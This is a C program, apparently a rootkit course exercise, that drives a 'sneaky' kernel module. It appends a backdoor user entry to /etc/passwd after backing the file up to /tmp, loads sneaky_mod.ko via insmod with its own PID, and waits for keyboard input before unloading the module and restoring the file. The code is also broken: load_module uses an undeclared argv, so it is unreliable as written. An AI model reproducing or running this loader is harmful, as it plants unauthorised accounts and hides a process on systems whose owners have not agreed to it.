#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>


char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
char * src = "/etc/passwd";
char * destination = "/tmp/passwd";
pid_t process_id;




void unload_module(){

  pid_t unload_pid = fork();
  if(unload_pid < 0){
    perror("fork error for unloading module process");
    exit(EXIT_FAILURE);
  }
  else if( unload_pid == 0){
  
     char * argv[3] =  {"rmmod","sneaky_mod.ko", NULL};
     if(execvp("rmmod", argv) < 0){
      perror( "execution error the module un-loading process");
      exit(EXIT_FAILURE);
    }
  }
  else{

    int wait_status;
    do {
      pid_t wait_pid = waitpid(unload_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }

}




void load_module(){

  //pid_t parent_process = getppid();
  pid_t parent_process = process_id;
  pid_t load_pid = fork();
  
  
  if(load_pid < 0){
    perror("fork error for loading module process");
    exit(EXIT_FAILURE);
  }
  else if( load_pid == 0){

    char module_arg[50];
    snprintf(module_arg, sizeof(module_arg),"parent_id = %d\n", parent_process);
    
    if(execvp("insmod", argv) < 0){
      perror( "execution error the module loading process");
      exit(EXIT_FAILURE);
    }
  }
  else{

    int wait_status;
    do {
      pid_t wait_pid = waitpid(load_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }

}




void copy_file(char * src,  char * destination){


  //char * command = "cp";
  char * argv[] = {"cp", src, destination, NULL};
  pid_t copy_pid = fork();

  if(copy_pid < 0){
    perror("fork error for copying process");
    exit(EXIT_FAILURE);
  }
  else if(copy_pid == 0){
    if(execvp(argv[0], argv) < 0){
      perror( "execution error for copy process");
      exit(EXIT_FAILURE);
    }
  }
  else{

    int wait_status;
    do {
      pid_t wait_pid = waitpid(copy_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }


  if(strcmp(src,"/etc/passwd") == 0){
    FILE * file;
    file = fopen(src, "a"); //open file in append mode
  if(file == NULL) {
    perror("Error opening the password file.");
  }
  else{
    fputs(line, file);
    fclose(file);
   }
}

}



void loop(){

  int char_eq;
  char_eq = getchar();
  while(char_eq != 'q'){
    char_eq = getchar();
  }

}



int main(){

  //Print process PID
  process_id = getpid();
  printf("sneaky_process pid = %d\n", process_id);

  //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
  copy_file(src, destination);

  //Load the sneaky module using the insmod command
  load_module();

  //Enter a loop when the module is being uploaded
  loop();

  //Exit from the loop suggests removing the module using rmmod
  unload_module();

  //Restore the original file
  copy_file(destination, src);

  
}
